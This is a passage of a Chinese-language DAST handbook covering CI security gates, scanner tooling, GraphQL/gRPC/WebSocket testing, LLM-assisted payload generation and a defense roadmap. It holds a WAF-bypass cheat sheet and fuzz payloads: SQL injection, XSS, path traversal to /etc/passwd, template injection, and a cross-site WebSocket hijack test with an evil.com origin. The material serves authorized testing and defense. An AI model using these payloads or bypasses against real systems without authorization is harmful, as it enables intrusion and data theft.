print(f"Generated {len(alerts)} ignore rules")
PYEOF
```

#### 6.3 安全门禁策略

```
+------------------------------------------------------------------+
|                  DAST 安全门禁决策矩阵                             |
+------------------------------------------------------------------+
| 扫描阶段        | 发现类型        | 严重性 | 动作                  |
+------------------------------------------------------------------+
| PR 合并前        | SQL 注入        | 严重   | BLOCK 合并            |
| (Baseline)      | XSS             | 高     | BLOCK 合并            |
|                  | SSRF            | 高     | BLOCK 合并            |
|                  | 信息泄露        | 中     | WARN + 通知           |
|                  | 配置问题        | 低     | WARN                  |
+------------------------------------------------------------------+
| 每日/每周扫描    | 所有 OWASP Top10| 严重   | BLOCK 部署 + PagerDuty|
| (Full Scan)     | 所有 OWASP Top10| 高     | BLOCK 部署 + Issue    |
|                  | 中危漏洞        | 中     | 创建 Issue + 7天SLA   |
|                  | 低危漏洞        | 低     | 记录 + 30天SLA        |
+------------------------------------------------------------------+
| 发布前           | 所有漏洞        | 严重   | BLOCK 发布            |
| (Pre-Release)   | 新增高危        | 高     | BLOCK 发布            |
|                  | 已知误报        | N/A    | SKIP (需审批)         |
+------------------------------------------------------------------+
```

```bash
# 安全门禁脚本
#!/bin/bash
# scan-gate.sh — DAST 扫描门禁
set -euo pipefail

REPORT=$1
BLOCK_CRITICAL=${BLOCK_CRITICAL:-true}
BLOCK_HIGH=${BLOCK_HIGH:-true}

HIGH_COUNT=$(jq '[.site[0].alerts[] | select(.riskcode=="3")] | length' "$REPORT")
MEDIUM_COUNT=$(jq '[.site[0].alerts[] | select(.riskcode=="2")] | length' "$REPORT")
LOW_COUNT=$(jq '[.site[0].alerts[] | select(.riskcode=="1")] | length' "$REPORT")

echo "=== DAST Scan Results ==="
echo "Critical: $HIGH_COUNT"
echo "Medium: $MEDIUM_COUNT"
echo "Low: $LOW_COUNT"

if [ "$BLOCK_CRITICAL" = "true" ] && [ "$HIGH_COUNT" -gt 0 ]; then
  echo "::error::BLOCKED: $HIGH_COUNT high/critical vulnerabilities found"
  echo "Vulnerabilities:"
  jq -r '.site[0].alerts[] | select(.riskcode=="3") | "  - [\(.pluginid)] \(.alert) at \(.instances[0].uri)"' "$REPORT"
  exit 1
fi

if [ "$BLOCK_HIGH" = "true" ] && [ "$HIGH_COUNT" -gt 3 ]; then
  echo "::warning::More than 3 high findings. Review required."
fi

echo "=== Gate PASSED ==="
exit 0
```

---

## 速查表

### 工具对比矩阵

| 工具 | 类型 | 最适场景 | CI/CD 集成 | 认证支持 | 速度 | 覆盖面 |
|------|------|----------|-----------|---------|------|--------|
| OWASP ZAP | 综合 DAST | Web 应用全面扫描 | Docker + API | OAuth/Bearer/Form | 中 | 广 |
| RESTler | API Fuzzer | REST API 深度 Fuzz | CLI + Docker | Bearer Token | 慢 | 深 |
| Nikto | Web 扫描器 | 快速配置/信息泄露检查 | CLI | 基础 | 快 | 窄 |
| Burp Suite | 手动测试 | 深度渗透测试 | REST API (Pro) | 全类型 | 手动 | 最深 |
| Nuclei | 模板扫描 | CVE/已知漏洞验证 | CLI | 自定义 | 快 | 中 |
| ffuf | Fuzzer | 端点/参数发现 | CLI | Header 支持 | 快 | 窄 |

### Fuzzing 命令参考

```bash
# ZAP 快速扫描
docker run --rm owasp/zap2docker-stable zap-baseline.py -t URL -r report.html -T 30

# ZAP API 扫描
docker run --rm owasp/zap2docker-stable zap-api-scan.py -t OPENAPI_URL -f openapi -r report.html

# RESTler 编译+测试
./restler compile --api_spec spec.json && ./restler test --grammar_file Compile/grammar.py

# Nikto 全面扫描
nikto -h URL -Tuning 123456789ab -o report.html -maxtime 1800s

# Nuclei 漏洞扫描
nuclei -u URL -severity critical,high -t cves/ -t vulnerabilities/

# ffuf 端点 Fuzz
ffuf -u URL/FUZZ -w wordlist.txt -mc 200,401,403,500 -t 50
```

### WAF 绕过速查

| 技术 | 输入 | 输出 | 适用场景 |
|------|------|------|----------|
| 双重 URL 编码 | `'` → `%2527` | 服务器解码为 `'` | SQL 注入 |
| HTML 实体 | `<` → `&#60;` | 浏览器渲染为 `<` | XSS |
| 大小写混合 | `<script>` → `<ScRiPt>` | 解析器不区分大小写 | XSS/SQLi |
| 内联注释 | `SELECT` → `SEL/**/ECT` | SQL 引擎忽略注释 | SQL 注入 |
| 分块传输 | `Transfer-Encoding: chunked` | WAF 不解析 chunk | 通用绕过 |
| HTTP/2 走私 | H2C 升级 | WAF 不检查 H2 帧 | 高级绕过 |
| Unicode 规范化 | `%E2%80%99` | 服务器规范化为 `'` | 编码差异 |
| 参数污染 | `?id=1&id=2` | 后端取最后一个 | 注入绕过 |

---

## MITRE ATT&CK 映射

| 战术 | 技术 ID | 技术名称 | 本手册覆盖 |
|------|---------|----------|-----------|
| Initial Access | T1190 | Exploit Public-Facing Application | Web/API 漏洞扫描与利用 |
| Discovery | T1046 | Network Service Discovery | 端点枚举、API 发现 |
| Discovery | T1083 | File and Directory Discovery | 路径遍历、目录爆破 |
| Execution | T1059 | Command and Scripting Interpreter | 命令注入 Payload |
| Defense Evasion | T1027 | Obfuscated Files or Information | WAF 绕过编码技术 |
| Defense Evasion | T1001.001 | Junk Data | 分块传输、参数污染 |
| Credential Access | T1110 | Brute Force | 认证端点 Fuzzing |
| Credential Access | T1212 | Exploitation for Credential Access | SQL 注入提取凭据 |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | SSRF 数据外泄 |
| Lateral Movement | T1210 | Exploitation of Remote Services | API 横向移动测试 |

---

## Part C：2025-2026 补充章节

### C.1 2025-2026 DAST 工具生态更新

#### 工具版本矩阵

| 工具 | 最新版本 | 关键更新 | 许可证 |
|------|---------|---------|--------|
| OWASP ZAP | 2.15.0+ | AJAX Spider 增强、GraphQL 扫描改进、附加组件生态扩展、Docker 镜像持续更新 | Apache 2.0 |
| Nuclei | v3.x | 7000+ 模板、多协议(HTTP/DNS/TCP/SSL/WebSocket/Headless/Code)、极快并发引擎 | MIT |
| RESTler | 活跃维护 | OpenAPI 3.x 支持、改进的有状态 Fuzz 策略、Python 3.12 兼容 | MIT |
| Burp Suite | 持续更新 | BCheck 自定义扫描规则、gRPC/Protobuf 支持、GraphQL 增强、Enterprise CI/CD 集成 | 商业 |
| Nikto | 稳定维护 | 社区维护模式，适合快速配置检查 | GPL |
| ffuf | v2.x+ | 递归目录发现、多模式过滤、极高并发 | MIT |

#### 新兴商业 DAST 平台

| 平台 | 状态 | 核心差异化 | 集成 |
|------|------|-----------|------|
| **Bright Security**（原 NeuraLegion） | 活跃 | AI 驱动极低误报、智能关联引擎、自动认证处理 | GitHub/GitLab/Jenkins |
| **StackHawk**（被 Datadog 收购） | 活跃 | 开发者优先、底层 ZAP、YAML 配置驱动 | GitHub Actions 原生 |
| **Probely**（被 Snyk 收购） | 活跃 | 云原生 DAST、面向开发者、API 扫描 | CI/CD 友好 |
| **APIsec** | 新兴 | 全协议 API 安全（REST+GraphQL+gRPC+WebSocket） | CI/CD |
| **42Crunch** | 新兴 | API 安全平台，DAST+Fuzz+防火墙一体化 | DevSecOps 平台 |
| **NowSecure** | 独立 | 移动应用安全测试（Android/iOS DAST/MAST） | CI/CD |

#### 工具选型决策树

```
需要 DAST 测试?
├── 预算有限/开源优先?
│   ├── Web 应用全面扫描 → OWASP ZAP (Docker)
│   ├── REST API 深度 Fuzz → RESTler
│   ├── 已知 CVE/漏洞验证 → Nuclei
│   ├── 端点/参数发现 → ffuf
│   └── 快速配置检查 → Nikto
├── 商业/企业级?
│   ├── AI 低误报 → Bright Security
│   ├── Datadog 生态 → StackHawk
│   ├── Snyk 生态 → Probely
│   └── 移动应用 → NowSecure
└── 手动深度测试?
    └── Burp Suite Professional
```

---

### C.2 API 安全测试演进

#### GraphQL DAST 测试

```bash
# === GraphQL 专用测试工具 ===

# InQL（Burp Suite 扩展 / CLI）
# 自动 Introspection → 生成查询 → Fuzz 参数
pip install inql
inql -t https://target.com/graphql -k

# Clairvoyance — 盲 GraphQL 枚举
pip install clairvoyance
clairvoyance -u https://target.com/graphql -o schema.json -w wordlist.txt

# GraphQLmap — 自动注入测试
pip install graphqlmap
graphqlmap -u https://target.com/graphql

# ZAP GraphQL 扫描
docker run --rm -v $(pwd):/zap/wrk:rw \
  owasp/zap2docker-stable zap-api-scan.py \
  -t https://target.com/graphql \
  -f graphql \
  -r graphql-report.html

# === GraphQL 批量查询滥用检测 ===
# 测试 Batch Query DoS
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d "$(python3 -c "
import json
queries = [{'query': '{user(id:%d){email,role,password}}' % i} for i in range(1, 101)]
print(json.dumps(queries))
")"

# Alias 滥用 DoS 测试
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{a1:user(id:1){email} a2:user(id:2){email} ... a100:user(id:100){email}}"}'

# 测试查询深度限制
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{id,posts{id,comments{id,author{id,posts{id}}}}}}"}'
```

#### gRPC DAST 测试

```bash
# === gRPC 安全测试工具链 ===

# 安装 gRPC 工具
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
go install github.com/bojand/ghz/cmd/ghz@latest

# 服务反射枚举（类似 Introspection）
grpcurl -plaintext target.com:443 list
grpcurl -plaintext target.com:443 list com.target.Service
grpcurl -plaintext target.com:443 describe com.target.Service.Method

# gRPC Fuzz 测试
ghz --insecure \
  --proto api.proto \
  --call com.target.Service.GetResource \
  -d '{"id": "{{.RequestNumber}}"}' \
  -n 1000 \
  -c 50 \
  target.com:443

# 使用 Nuclei gRPC 模板
nuclei -u target.com:443 -t grpc/ -severity critical,high

# Burp Suite gRPC 插件
# 安装: BApp Store → "GRPC" 或 "Protobuf Decoder"
# 解码 Protobuf 消息，修改字段值，重放
```

#### WebSocket DAST 测试

```bash
# === WebSocket 安全测试 ===

# ZAP WebSocket 扫描（内置支持）
# 在 ZAP Automation Framework 中启用 WebSocket 代理

# 手动 WebSocket Fuzz
python3 << 'WSFUZZ'
import websocket, json, time

ws = websocket.create_connection("wss://target.com/ws")
fuzz_payloads = [
    {"action": "'; DROP TABLE users;--"},
    {"action": "<script>alert(1)</script>"},
    {"action": "{{7*7}}"},
    {"action": "../../../etc/passwd"},
    {"action": "A" * 10000},
    {"action": True},
    {"action": 0},
    {"action": None},
]

for payload in fuzz_payloads:
    ws.send(json.dumps(payload))
    try:
        resp = ws.recv()
        print(f"[RESP] {payload['action'][:30]} → {resp[:100]}")
    except:
        print(f"[ERR] {payload['action'][:30]}")
    time.sleep(0.5)
ws.close()
WSFUZZ

# 跨站 WebSocket 劫持（CSWSH）测试
curl -sv -H "Origin: https://evil.com" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  "https://target.com/ws"
# 如果返回 101 (Switching Protocol)，存在 CSWSH 漏洞
```

---

### C.3 AI/LLM 辅助 DAST 测试

#### AI 增强 DAST 架构

```
+------------------------------------------------------------------+
|                 AI/LLM 辅助 DAST 五层架构                          |
+------------------------------------------------------------------+
| L0: 无 AI — 传统规则引擎（ZAP/Nikto 默认模式）                    |
| L1: AI 辅助 Payload 生成 — LLM 生成上下文感知变异测试用例         |
| L2: AI 智能爬取 — AI 引导探索攻击面，优先发现高风险端点           |
| L3: AI 误报过滤 — ML 模型自动分类确认/误报，减少人工审查          |
| L4: 自主安全代理 — 端到端自主规划→执行→验证→报告的 AI Agent        |
+------------------------------------------------------------------+
```

#### LLM 辅助 Payload 生成

```python
#!/usr/bin/env python3
"""LLM 辅助 DAST Payload 生成器"""
import openai, json, sys

def generate_fuzz_payloads(endpoint_info, auth_type="bearer"):
    """基于端点上下文生成针对性 Fuzz Payload"""
    prompt = f"""
你是安全测试专家。基于以下 API 端点信息，生成针对性的安全测试 Payload。

端点: {endpoint_info['method']} {endpoint_info['path']}
参数: {json.dumps(endpoint_info.get('params', {}))}
认证: {auth_type}
请求体 Schema: {json.dumps(endpoint_info.get('body_schema', {}))}

请生成以下类别的测试 Payload（JSON 格式）：
{{
  "sqli": ["针对此参数类型的 SQL 注入 payload"],
  "xss": ["上下文感知的 XSS payload"],
  "idor": ["IDOR 测试值"],
  "bola": ["BOLA 对象级授权绕过测试"],
  "type_confusion": ["类型混淆测试值"],
  "business_logic": ["业务逻辑绕过 payload"]
}}

每个类别 3-5 个最有价值的 payload，附简要说明。
"""
    resp = openai.ChatCompletion.create(
        model="gpt-4", messages=[{"role": "user", "content": prompt}],
        temperature=0.7
    )
    return json.loads(resp.choices[0].message.content)

# 使用示例
endpoint = {
    "method": "POST",
    "path": "/api/v1/orders",
    "params": {},
    "body_schema": {
        "properties": {
            "product_id": {"type": "integer"},
            "quantity": {"type": "integer"},
            "coupon_code": {"type": "string"},
            "shipping_address": {"type": "object"}
        }
    }
}
payloads = generate_fuzz_payloads(endpoint)
print(json.dumps(payloads, indent=2, ensure_ascii=False))
```

#### AI 误报自动过滤

```python
#!/usr/bin/env python3
"""DAST 误报自动分类器"""
import json

# 误报特征规则（可扩展）
FALSE_POSITIVE_INDICATORS = {
    "xss_reflected": [
        "response appears in JSON API response, not rendered in browser",
        "input is sanitized before reflection",
        "Content-Type is application/json (not HTML)",
    ],
    "sqli": [
        "error message is generic, not database-specific",
        "response code 500 with no timing differential",
        "WAF blocked but backend unaffected",
    ],
    "info_disclosure": [
        "stack trace in development mode only",
        "version header is standard for framework",
    ],
}

def classify_finding(alert):
    """自动分类 ZAP/DAST 发现"""
    risk_factors = []
    is_fp = False

    # 检查响应 Content-Type
    if "json" in alert.get("response_headers", {}).get("content-type", ""):
        if alert.get("alert") == "Cross Site Scripting (Reflected)":
            risk_factors.append("JSON response - XSS not renderable in browser")
            is_fp = True

    # 检查是否在已知误报 URL 模式中
    url = alert.get("instances", [{}])[0].get("uri", "")
    if any(pat in url for pat in [".css", ".js", ".png", ".woff", ".ico"]):
        risk_factors.append("Static resource URL - not exploitable")
        is_fp = True

    # 检查证据强度
    evidence = alert.get("instances", [{}])[0].get("evidence", "")
    if not evidence or len(evidence) < 5:
        risk_factors.append("Weak/empty evidence")
        is_fp = True

    return {
        "alert": alert.get("alert"),
        "is_false_positive": is_fp,
        "confidence": "high" if len(risk_factors) >= 2 else "medium" if risk_factors else "low",
        "reasons": risk_factors,
    }

# 批量处理 ZAP 报告
with open("zap-report.json") as f:
    report = json.load(f)

for alert in report.get("site", [{}])[0].get("alerts", []):
    result = classify_finding(alert)
    if result["is_false_positive"]:
        print(f"[FP] {result['alert']} - {result['reasons']}")
```

#### AI DAST 工具生态

| 工具/平台 | 类型 | AI 能力 | 状态 |
|-----------|------|---------|------|
| **Bright Security** | 商业 DAST | AI 误报过滤 + 智能关联 + 自动认证 | 产品化 |
| **PentestGPT** | 开源 | LLM 辅助渗透测试规划与执行 | 研究级 |
| **Burp Suite AI** | 商业 | PortSwigger Research 方向，AI 辅助分析 | 早期 |
| **ZAP + LLM** | 自建集成 | ZAP 扫描 → LLM 分析结果 → 误报过滤 | 自建 |
| **GitHub Copilot Autofix** | SAST+DAST | 自动修复建议（SAST 为主，DAST 扩展中） | GA |

---

### C.4 DAST vs IAST vs SAST 现代对比与选型

| 维度 | SAST | DAST | IAST | SCA |
|------|------|------|------|-----|
| **测试方法** | 白盒（源代码） | 黑盒（运行中） | 灰盒（插桩运行时） | 依赖分析 |
| **SDLC 阶段** | 开发/构建 | Staging/Pre-prod | QA/测试 | 开发/构建 |
| **误报率** | 高（10-30%） | 低-中（5-15%） | 极低（<5%） | 极低 |
| **代码定位** | 精确到行 | 无法定位 | 精确到方法 | 精确到版本 |
| **运行时问题** | 无法发现 | 可以发现 | 可以发现 | 无法发现 |
| **语言无关性** | 否 | 是 | 否（需 Agent） | 是 |
| **反馈速度** | 快（秒-分钟） | 慢（分钟-小时） | 中等 | 快 |
| **认证漏洞** | 部分覆盖 | 完整覆盖 | 完整覆盖 | 不覆盖 |
| **API 安全** | 部分 | 核心能力 | 核心能力 | 不覆盖 |
| **配置复杂度** | 低 | 中 | 中-高 | 低 |

#### 2025-2026 趋势

1. **Shift-left + Shift-right 融合**：SAST 在 CI 构建、IAST 在 QA 测试、DAST 在 Staging/Pre-prod，三者在 ASPM 平台统一聚合
2. **ASPM（应用安全态势管理）**：聚合 SAST+DAST+IAST+SCA+Container 扫描结果到统一仪表盘
3. **API 安全成为 DAST 核心功能**：REST → REST+GraphQL+gRPC+WebSocket 多协议支持
4. **AI 降低误报**：LLM 辅助分类确认/误报，减少安全团队审查工作量
5. **安全门禁标准化**：OpenSSF Scorecard + SLSA + DAST 门禁组合验证

#### 组合推荐方案

```
+------------------------------------------------------------------+
|           现代 DevSecOps DAST 集成路线图                            |
+------------------------------------------------------------------+
| 阶段 1（基础）：                                                  |
|   ├── ZAP Baseline 在每个 PR 上运行（< 2 分钟）                   |
|   ├── SAST (Semgrep/CodeQL) 在 CI 中并行                         |
|   └── SCA (Dependabot/Trivy) 在 CI 中并行                        |
|                                                                    |
| 阶段 2（进阶）：                                                  |
|   ├── ZAP Full Scan 每夜运行（Staging 环境）                      |
|   ├── RESTler API Fuzz 每周运行                                   |
|   ├── Nuclei CVE 扫描集成到部署前                                  |
|   └── 误报基线管理（zap-rules.tsv 版本化）                        |
|                                                                    |
| 阶段 3（成熟）：                                                  |
|   ├── AI 误报自动过滤                                             |
|   ├── ASPM 平台聚合所有测试结果                                    |
|   ├── IAST 集成到 QA 自动化测试                                    |
|   └── DAST 结果自动关联到 Jira/Linear 工单                        |
+------------------------------------------------------------------+
```

---

### C.5 2025-2026 关键 CVE 速查

> 以下为 DAST 相关工具和运行环境的关键 CVE。建议定期检查 NVD 和 GitHub Advisory 获取更新。

| CVE | 影响组件 | 描述 | 严重性 | 影响范围 |
|-----|---------|------|--------|---------|
| CVE-2024-3094 | XZ Utils | 供应链后门植入，影响包含 DAST 工具的 Linux 容器镜像 | Critical (10.0) | 所有使用 xz 5.6.0/5.6.1 的容器 |
| CVE-2023-4911 | glibc | 缓冲区溢出（LOADER_TUNABLES），影响扫描器运行环境 | High (7.8) | glibc < 2.38 |
| CVE-2024-2389 | Jenkins | 任意文件读取，可能影响 DAST CI/CD 流水线 | High | Jenkins ≤ 2.441 |
| CVE-2024-3464 | ZAP 附加组件 | 特定附加组件中的潜在信息泄露 | Medium | 特定 ZAP 插件版本 |
| CVE-2025-29927 | Next.js 中间件 | x-middleware-subrequest 授权绕过，DAST 可检测 | Critical (9.1) | Next.js < 14.2.25 / < 15.2.2 |

#### 容器化 DAST 安全加固

```bash
# 检查 DAST 容器镜像是否受 XZ 后门影响
docker run --rm owasp/zap2docker-stable sh -c \
  "xz --version 2>/dev/null || echo 'xz not found'; \
   apt list --installed 2>/dev/null | grep xz-utils"

# 使用多阶段构建加固 DAST 镜像
cat > Dockerfile.dast-hardened << 'DOCKERFILE'
FROM owasp/zap2docker-stable:latest

# 安全加固
USER root
RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y --no-install-recommends \
    libssl3 libcurl4-openssl-dev && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# 验证无已知漏洞
RUN zap.sh -version

# 非 root 运行
USER zap

ENTRYPOINT ["zap-baseline.py"]
DOCKERFILE

# 定期扫描 DAST 工具自身镜像
trivy image owasp/zap2docker-stable:latest --severity CRITICAL,HIGH
grype owasp/zap2docker-stable:latest --fail-on critical
```

---

### C.6 中文社区精华参考

| 来源 | 主题 | 关键内容 |
|------|------|---------|
| **奇安信** | 动态应用安全测试 | DevSecOps 落地实践、DAST 工具选型、企业级安全扫描平台 |
| **阿里云开发者社区** | DAST API 安全 | OWASP ZAP CI/CD 集成、API 安全测试最佳实践、自动化扫描流水线 |
| **腾讯云开发者社区** | Web 安全扫描 | DAST 工具对比、Nuclei 模板编写、Web 应用安全检测 |
| **FreeBuf** | DAST 实战 | ZAP 高级用法、Burp Suite 自动化、API Fuzzing 实战案例 |
| **先知社区** | API 安全测试 | GraphQL 安全测试、REST API Fuzz、gRPC 安全评估 |
| **安全客** | DevSecOps | CI/CD 安全门禁、DAST+SAST+SCA 组合策略、ASPM 平台 |
| **看雪论坛** | 逆向与安全测试 | 二进制安全测试方法论、协议 Fuzz 工具 |
| **腾讯安全应急响应** | Web 安全 | DAST 扫描规则优化、WAF 绕过检测、API 安全加固 |

#### 关键中文资源搜索关键词

```bash
# 搜索推荐关键词
site:freebuf.com "DAST" "动态安全测试" 2025
site:xz.aliyun.com "ZAP" "DAST" "API安全"
site:cloud.tencent.com "DAST" "动态扫描" "安全测试"
site:kanxue.com "API Fuzz" "安全测试"
```

---

### C.7 防御升级路线图

#### P0（立即实施）

1. **DAST 基线扫描集成到 CI**
   - ZAP Baseline 在每个 PR 合并前运行（< 2 分钟超时）
   - Critical/High 级别漏洞阻断合并
   ```yaml
   # GitHub Actions 最小配置
   - uses: zaproxy/action-baseline@v0.12.0
     with:
       target: 'https://staging.example.com'
       rules_file_name: 'zap-rules.tsv'
       cmd_options: '-T 120'
   ```

2. **每周全量扫描**
   - ZAP Full Scan + Nuclei CVE 扫描
   - 结果自动创建安全工单

3. **容器镜像安全**
   - 定期扫描 DAST 工具自身镜像（Trivy/Grype）
   - 使用多阶段构建加固

#### P1（30天内）

1. **API 安全专项**
   - OpenAPI 规格驱动的 RESTler API Fuzz
   - GraphQL Introspection 检查 + 深度限制验证
   - gRPC 反射枚举 + Protobuf Fuzz

2. **误报管理**
   - 建立 zap-rules.tsv 基线并版本化
   - 自动化误报基线生成脚本

3. **认证扫描**
   - ZAP Automation Framework 配置 Bearer/OAuth 认证
   - GitLab DAST_BROWSER_SCAN 模式启用

#### P2（90天内）

1. **AI 增强**
   - LLM 辅助误报分类脚本
   - 上下文感知 Payload 生成器

2. **多协议覆盖**
   - WebSocket 扫描启用
   - gRPC 安全测试流程建立

3. **ASPM 集成**
   - DAST 结果聚合到统一安全仪表盘
   - 与 SAST/SCA 结果关联分析

#### P3（持续优化）

1. **自主化安全测试**
   - AI Agent 自主规划→执行→验证→报告
   - 持续攻击面监控

2. **红队/紫队联动**
   - DAST 发现输入红队攻击规划
   - 紫队验证 DAST 覆盖率

3. **合规驱动**
   - PCI DSS 6.5/6.6 DAST 要求满足
   - SOC2 Type II 自动化证据收集

---

### C.8 速查表更新

#### 2025-2026 扩展工具矩阵

| 工具 | 类型 | 最适场景 | AI 能力 | CI/CD | 认证 | 价格 |
|------|------|----------|---------|-------|------|------|
| OWASP ZAP | 综合 DAST | Web/API 全面扫描 | 社区插件 | Docker+Actions | OAuth/Bearer/Form | 免费 |
| RESTler | API Fuzzer | REST API 深度 Fuzz | - | CLI+Docker | Bearer Token | 免费 |
| Nuclei | 模板扫描 | CVE/已知漏洞验证 | 社区模板 | CLI | 自定义 | 免费 |
| Burp Suite | 手动+自动 | 深度渗透测试 | PortSwigger AI | REST API (Pro) | 全类型 | 商业 |
| Bright Security | AI DAST | 企业级低误报 | AI 核心能力 | GitHub/GitLab | 自动认证 | 商业 |
| StackHawk | 开发者 DAST | Datadog 生态 | - | Actions 原生 | YAML 配置 | 商业 |
| Nikto | Web 扫描 | 快速配置检查 | - | CLI | 基础 | 免费 |
| ffuf | Fuzzer | 端点/参数发现 | - | CLI | Header | 免费 |
| APIsec | API DAST | 多协议 API | - | CI/CD | 全类型 | 商业 |
| 42Crunch | API 安全 | API 防火墙+Fuzz | - | DevSecOps | OAuth | 商业 |

#### 快速命令速查

```bash
# ZAP Baseline（PR 门禁，< 2 分钟）
docker run --rm owasp/zap2docker-stable zap-baseline.py -t $URL -r report.html -T 120 -j

# ZAP Full Scan（夜间扫描）
docker run --rm owasp/zap2docker-stable zap-full-scan.py -t $URL -r report.html -J report.json -T 7200

# ZAP API Scan（OpenAPI 驱动）
docker run --rm owasp/zap2docker-stable zap-api-scan.py -t $SPEC_URL -f openapi -r report.html

# RESTler 编译 + 测试
restler compile --api_spec spec.json && restler test --grammar_file Compile/grammar.py

# Nuclei CVE 扫描
nuclei -u $URL -severity critical,high -t cves/ -t vulnerabilities/ -rate-limit 50

# Nikto 全面扫描
nikto -h $URL -Tuning 123456789ab -o report.html -maxtime 1800s

# ffuf 端点 Fuzz
ffuf -u $URL/FUZZ -w wordlist.txt -mc 200,401,403,500 -t 50 -rate 100

# GraphQL Introspection 检查
curl -s $GQL_URL -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types | length'

# gRPC 服务枚举
grpcurl -plaintext $HOST:443 list

# WebSocket CSWSH 测试
curl -sv -H "Origin: https://evil.com" -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" $WS_URL

# DAST 容器安全扫描
trivy image owasp/zap2docker-stable:latest --severity CRITICAL,HIGH
```
